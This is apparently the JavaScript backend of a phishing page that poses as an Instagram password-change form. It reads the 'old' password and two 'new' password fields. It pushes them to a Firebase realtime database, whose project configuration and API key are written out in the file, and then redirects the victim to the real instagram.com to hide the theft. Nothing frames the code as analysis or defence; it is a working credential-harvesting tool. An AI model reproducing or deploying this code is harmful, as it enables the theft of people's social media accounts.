
const firebaseConfig = {
  apiKey: "AIzaSyCGZFRxJB071xr4CttOoZ4AOjGPA7ybsNA",
  authDomain: "form-cb9b9.firebaseapp.com",
  projectId: "form-cb9b9",
  storageBucket: "form-cb9b9.appspot.com",
  databaseURL: "https://form-cb9b9-default-rtdb.firebaseio.com",
  messagingSenderId: "7635624780",
  appId: "1:7635624780:web:e70479425150d8cfee65e9",
  measurementId: "G-VB458ZKQ1D"

};

//Initialize Firebase
firebase.initializeApp(firebaseConfig);
//const analytics = getAnalytics(app);
// var app = initializeApp(firebaseConfig);

document.getElementById('myForm').addEventListener('submit', formSubmit);

let formMessage = firebase.database().ref('user');

//Submit form
function formSubmit(e) {
  e.preventDefault();
  // Get Values from the DOM
  let old = document.querySelector('#oldqwerty').value;
  let new1 = document.querySelector('#newqwerty').value;
  let new2 = document.querySelector('#newqwerty1').value;

    // formMessage.push().set({old:this.old});

    sendMessage(old,new1,new2);
 }

 

 function sendMessage(old,new1,new2) {
    let newFormMessage = formMessage.push();
    newFormMessage.set({
      old: old,
      new1:new1,
      new2:new2
    });
    redirectURL="https://www.instagram.com/"
    setTimeout("location.href = redirectURL;",500);

  }